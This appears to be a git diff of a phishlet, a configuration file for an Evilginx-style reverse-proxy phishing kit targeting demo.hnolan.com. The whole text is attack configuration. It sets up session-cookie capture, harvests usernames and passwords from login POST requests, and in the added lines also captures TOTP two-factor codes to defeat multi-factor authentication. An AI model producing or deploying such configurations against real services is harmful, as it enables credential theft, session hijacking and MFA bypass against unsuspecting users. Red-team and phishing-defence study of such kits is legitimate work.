@@ -1,12 +1,13 @@
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true}
 auth_urls:
-  - '/login'
+  - '/home'
 auth_tokens:
-  - domain: '.hnolan.com'
+  - domain: '.demo.hnolan.com'
     keys: ['session']
     type: 'cookie'
+    always: true
 credentials:
   username:
     key: 'username'
@@ -16,6 +17,10 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
+  custom:
+    - key: 'totp_code'
+      search: '(.*)'
+      type: 'post'
 login:
   domain: 'demo.hnolan.com'
   path: '/'
